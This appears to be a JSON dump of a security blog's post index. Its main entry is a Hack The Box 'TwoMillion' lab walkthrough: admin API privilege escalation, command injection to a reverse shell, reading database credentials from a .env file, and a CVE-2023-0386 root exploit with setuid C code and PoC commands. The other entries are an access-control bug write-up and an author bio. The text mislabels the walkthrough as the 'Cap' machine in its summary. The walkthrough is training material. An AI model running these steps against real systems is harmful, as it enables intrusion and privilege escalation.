{\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;data\u0026#34;:\u0026#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr\u0026#34;,\u0026#34;enctype\u0026#34;:\u0026#34;ROT13\u0026#34;},\u0026#34;hint\u0026#34;:\u0026#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\u0026#34;} We have converted the ROT13 string to cleartext format and it gave a hint for another endpoint.\nIn order to generate the invite code, make a POST request to /api/v1/invite/generate Upon sending a POST request for Generate-invite application returns a base64 encoded string.\n\u0026gt; curl -X POST http://2million.htb/api/v1/invite/generate {\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;code\u0026#34;:\u0026#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;encoded\u0026#34;}} We have converted the base64 encoded string to clear text format which gives us our invitation code.\n\u0026gt; echo \u0026#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\u0026#34; | base64 -d 0MEG4-BRSC3-HHYJD-S45QD Registration Page We have entered our invitation code and which allows us to login into application with our username and password.\nUser Dashboard We have login into the application and we saw very limited options. A few of them are:\nDashboard FAQ Generate the VPN Connection File Available API Endpoints The interesting part of generating a VPN connection file was, It is called the api/v1/user/vpn/download. We can get the list of API endpoints by calling the /api/v1.\nIt was observed that the application contains the admin API as well. Admin API contains 3 endpoints:\nGET - /api/v1/admin/auth : Check if user is admin or not POST - /api/v1/admin/vpn/generate : Generate VPN for specific user PUT - /api/v1/admin/settings/update : Update user settings Check User Admin Right Status Update the User Rights Update admin settings API returns the error message which shows that the API request is missing an email parameter.\nWe have added the email parameter and sent the request. It\u0026rsquo;s observed that the API request is missing the \u0026ldquo;is_admin\u0026rdquo; parameter. We have added the missing parameter and based on the response it\u0026rsquo;s observed that the User has now admin privilege. Admin Access Check Generate VPN File Command Execution It\u0026rsquo;s observed that generated VPN profile endpoint is vulnerable to command Injection. Shell as www-data To get the reverse shell, we are using the netcat command.\nVolia ğŸ¥³ We got the connection back to our terminal.\nLet\u0026rsquo;s Upgrade the shell:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export TERM=xterm ctrl + z stty raw -echo; fg Get the User Flag Let\u0026rsquo;s cat the user flagâ€¦! Look like www-data user doesn\u0026rsquo;t have permission to view the file.\nwww-data@2million:/home/admin$ cat user.txt cat: user.txt: Permission denied List the Files, Directories and it\u0026rsquo;s permission:\nwww-data@2million:/home/admin$ ls -al total 32 drwxr-xr-x 4 admin admin 4096 Jun 6 2023 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. lrwxrwxrwx 1 root root 9 May 26 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 admin admin 220 May 26 2023 .bash_logout -rw-r--r-- 1 admin admin 3771 May 26 2023 .bashrc drwx------ 2 admin admin 4096 Jun 6 2023 .cache -rw-r--r-- 1 admin admin 807 May 26 2023 .profile drwx------ 2 admin admin 4096 Jun 6 2023 .ssh -rw-r----- 1 root admin 33 Jan 18 12:03 user.txt Shell as admin We tried few ways to login as admin. From hint, we found that the .env file contains the DB username and password.\nwww-data@2million:~/html$ ls -al total 56 drwxr-xr-x 10 root root 4096 Jan 18 15:20 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. -rw-r--r-- 1 root root 87 Jun 2 2023 .env -rw-r--r-- 1 root root 1237 Jun 2 2023 Database.php -rw-r--r-- 1 root root 2787 Jun 2 2023 Router.php drwxr-xr-x 5 root root 4096 Jan 18 15:20 VPN drwxr-xr-x 2 root root 4096 Jun 6 2023 assets drwxr-xr-x 2 root root 4096 Jun 6 2023 controllers drwxr-xr-x 5 root root 4096 Jun 6 2023 css drwxr-xr-x 2 root root 4096 Jun 6 2023 fonts drwxr-xr-x 2 root root 4096 Jun 6 2023 images -rw-r--r-- 1 root root 2692 Jun 2 2023 index.php drwxr-xr-x 3 root root 4096 Jun 6 2023 js drwxr-xr-x 2 root root 4096 Jun 6 2023 views Environment Variables:\nwww-data@2million:~/html$ cat .env DB_HOST=127.0.0.1 DB_DATABASE=htb_prod DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 We have the env variable file which contains the username and password. Let\u0026rsquo;s try to open the /etc/passwd file and see if does admin user exists in the system or not. It looks like the admin user does exist on the system.\nShell as admin We can log in as admin users who read the user flag.\nNow, Let\u0026rsquo;s jump for root flag ğŸš©\nShell as root From the hint, we get to know that the admin user has to do something with the mail system on Linux. We got the admin file under the mail directory which contains the mail from ch4p regarding the Patching System OS.\nFrom: ch4p \u0026lt;ch4p@2million.htb\u0026gt; To: admin \u0026lt;admin@2million.htb\u0026gt; Cc: g0blin \u0026lt;g0blin@2million.htb\u0026gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: \u0026lt;9876543210@2million.htb\u0026gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I\u0026#39;m know you\u0026#39;re working as fast as you can to do the DB migration. While we\u0026#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can\u0026#39;t get popped by that. HTB Godfather Failed Attempt We searched OverlayFS CVE and came across this article by ProjectDiscovery.\nWe got the access as the root user but still, it\u0026rsquo;s not a complete root permission.\nCVE-2023-0386 Analysis I started searching again and it\u0026rsquo;s observed that the machine is vulnerable to CVE-2023-0386.\nFrom Google: CVE-2023-0386 is a high-severity vulnerability in the Linux kernel\u0026rsquo;s overlayfs filesystem. Improper permission handling allows local attackers to easily escalate privileges to root, compromising the entire system.\nHow to Detect? The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the commandÂ uname -r\nA system is likely to be vulnerable if it has a kernel version lower than 6.2. We found that our Linux machine is running on 5.15\nadmin@2million:~$ uname -r 5.15.70-051570-generic Let\u0026rsquo;s understand what is SUID, OverlayFSâ€¦\nWhat is SUID bit? SUID, short for Set User ID, isÂ a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file\u0026rsquo;s owner.\nWhat is OverlayFS? Overlay filesystems, also known as â€œunion filesystemsâ€ or â€œunion mountsâ€ let you mount a filesystem using 2 directories: a â€œlowerâ€ directory, and an â€œupperâ€ directory.\n1. Structure OverlayFS uses three main components:\nLower directory: Read-only base layer containing the original files. Upper directory: Writable layer where changes are made. Merged view: The combined result of the lower and upper directories. 2. File Operations Read: If a file exists in both layers, the version in the upper layer is presented. If a file exists only in the lower layer, it is accessed from there. Write: If a file in the lower layer is modified, it is copied to the upper layer first (copy-on-write), and then the changes are applied to the copy. Delete: When a file in the lower layer is deleted, it is \u0026ldquo;hidden\u0026rdquo; by creating a whiteout marker in the upper layer. 3. Mounting Example Assume you have:\nLower layer: /lower Upper layer: /upper Mount point: /merged Command to create an overlay:\nmount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged How does the CVE-2023-0386 Works? Pretending to Have a Root-Owned File:\nThe attacker uses a trick called FUSE (a tool for making fake filesystems) to create a \u0026ldquo;fake\u0026rdquo; file that looks like: It\u0026rsquo;s owned by the system administrator (root). It has the SUID bit set, which means running this file will give whoever runs it admin-level privileges. Normally, creating such a file directly on the system isnâ€™t allowed unless you\u0026rsquo;re already an admin. But with FUSE, you can fake it.\nCreate a Safe \u0026ldquo;Sandbox\u0026rdquo; Environment:\nThe attacker uses something called user namespaces to create a sandbox environment. This lets them temporarily do things (like mounting filesystems) that normally require admin permissions. Set Up the OverlayFS Trick:\nThe attacker sets up an OverlayFS filesystem: The lower directory (base layer) is the fake filesystem they made with FUSE. The upper directory (writable layer) is something like /tmp, where anyone can write files. Trigger the Kernel Bug:\nThe attacker \u0026ldquo;copies\u0026rdquo; the fake file (from the lower layer) to the writable layer (upper directory). When the kernel handles this copy, it believes the fake fileâ€™s permissions and creates a real file in /tmp that: Is owned by root. Has the SUID bit set. Escape the Sandbox and Exploit the File:\nThe attacker exits the sandbox and now has a real root-owned SUID file in /tmp. They execute this file to become root and take full control of the system. Code Example Here is the code example which I took from the Datadog article.\nThe code written in C will try to set setuid and setgid to root.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(void) { int result; result = setuid(0); if (result != 0 ) { printf(\u0026#34;could not setuid(0): %s\\n\u0026#34;, strerror(errno)); return result; } result = setgid(0); if (result != 0) { printf(\u0026#34;could not setguid(0): %s\\n\u0026#34;, strerror(errno)); return result; } printf(\u0026#34;Starting root shell...\\n\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); return 0; } Since, to set the uid or gid to root, User requires the root permission. As per expectations, We can see the Operation not permitted error from the code.\njohn@machine:~$ gcc -Wall setuid.c -o setuid john@machine:~$ chmod +x setuid john@machine:~$ ./setuid could not setuid(0): Operation not permitted Here, User has changed the file\u0026rsquo;s user and group ownership to root and also assigned the SUID to the file.\nroot@machine:/home/john$ chown root:root setuid root@machine:/home/john$ chmod +s setuid Here, Lower privilege user John executed the file and since setuid file contains the SUID permission, at the end of file execution John was able to get the Root Shell.\njohn@machine:~$ ./setuid Starting root shell... root@machine:~$ id uid=0(root) gid=0(root) groups=0(root),1002(john) Geting Root Flag I was using the POC for CVE-2023-0398 created by xkaneikiwhich is already available on Github.\nCommands:\nmake all ./fuse ./ovlcap/lower ./gc \u0026amp; ./exp We have the root flag.\nWe also have thank you message from HTB team. Let\u0026rsquo;s try to read the message.\nThank You Message from HTB Team Final Thank You Message Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here\u0026#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team References https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ https://github.com/xkaneiki/CVE-2023-0386 https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ Connect with Me LinkedIn Twitter GitHub Hack The Box ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/","summary":"Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques","title":"HTB TwoMillion Walkthrough"},{"content":"\nDiscover a broken access control vulnerability in a popular productivity app with over 2 million users. This post details how an employee gained limited admin privileges by manipulating the API\u0026rsquo;s workspace ID, including steps to reproduce the exploit.\nApplication Overview Itâ€™s a productivity app that has over 2 million+ users and is used by business to track employee project time and expenses.\nKey Features There are many features, but these are some of the most important ones:\nUser can join multiple workspaces User can create their own workspace The admin of a workspace can invite other user by email How does the application work? A user can join multiple workspaces from one account, but the user ID will be the same across all the workspace. So, the user create personal workspace and along with company\u0026rsquo;s workspace\nThe API uses the workspace ID to interact with the application.\nThis is what the request look a like: This is how Workspace ID look a like: While the test for role-based broken access control, uses multi-account containers where cookies are separated by container, allowing us to use the web with multiple accounts.\nWhile the test for role-based broken access control, Use PwnFox to colorize the tab and burpsuite proxy history.\nThere are a few sections that are only visible to the admin. On the user side, we have limited functionalities. If we change the workspace ID directly, it will redirect me to its homepage. We use burpâ€™s match and replace feature to replace the Workspace ID.\nThis is the final result when the user successfully matches and replaces the personal workspace ID with the companyâ€™s workspace ID.\nStep to Reproduce End Note If you have enjoyed this article, Share this with your friends. Thank you! https://linktr.ee/bhavikkanejiya\nReferences Automating IDORs with Autorize - Common API Bugs Pt. 2 - IDORs \u0026amp; Access Control Issues by @Asseem_shrey PimpMyBurp #1 â€“ PwnFox + Autorize Burp Suite tutorial: IDOR vulnerability automation using Autorize and AutoRepeater Two account takeover bugs worth $$$$ ","permalink":"https://bhavik-kanejiya.github.io/blog/lets-peek-inside-the-admin-dashboard/","summary":"Discover a broken access control vulnerability in a popular productivity app with over 2 million users. This post details how an employee gained limited admin privileges by manipulating the API\u0026rsquo;s workspace ID, including steps to reproduce the exploit.","title":"Letâ€™s do a peek inside the admin dashboard - Abuse API endpoint"},{"content":"Bhavik Kanejiya Associate Consultant | Cybersecurity Enthusiast | Pentester\nğŸ“ Bangalore, India | ğŸ“§ caesorx@duck.com | ğŸ”— LinkedIn | ğŸ§‘â€ğŸ’» GitHub\nProfessional Summary Penetration testing and network security specialist with 2 years of experience securing web applications, APIs, mobile apps, Kubernetes, and cloud environments. Identified and mitigated multiple critical vulnerabilities, reducing risk by 60%. Skilled at integrating security into development lifecycles to deliver robust solutions and foster innovation. Proven collaborator in cross-functional teams, driving secure and scalable outcomes.\nProfessional Skills Technical Web, API, Mobile (Android \u0026amp; iOS), Thick Client, Phishing, AWS, Kubernetes, Docker, Python, Bash, Linux, Windows Tools Burp Suite, OWASP ZAP, Nmap, Nessus, Postman, Wireshark, IBM AppScan Work Experience Associate Consultant @KPMG India | April 2025 â€“ Present\nAnalyst @KPMG India | June 2023 â€“ March 2025\nPenetration Tester Intern @HackersEra | Nov 2022 â€“ May 2023\nCertifications \u0026amp; Training AZ-900 â€“ Microsoft Azure Fundamentals (12/2024) - View Credential AWS Certified Cloud Practitioner (12/2023) - Verify Credential Certified Mobile Pentester (CMPen) â€“ Android, The SecOps Group (09/2023) The Kubernetes Crusade: Defending \u0026amp; Attacking Kubernetes, Nullcon (05/2024) Presentations Attacking and Defending Kubernetes - Presented at Null Bangalore\nDelivered a session on Kubernetes architecture, vulnerabilities, and defense strategies (150+ attendees). Education BCA â€“ Computer Science, Shri Shambhubhai V. Patel College of C.S. \u0026amp; B.M., Surat, Gujarat\nApril 2022\nLast Updated: June 2025\n","permalink":"https://bhavik-kanejiya.github.io/about/","summary":"About Me","title":"About Me"}]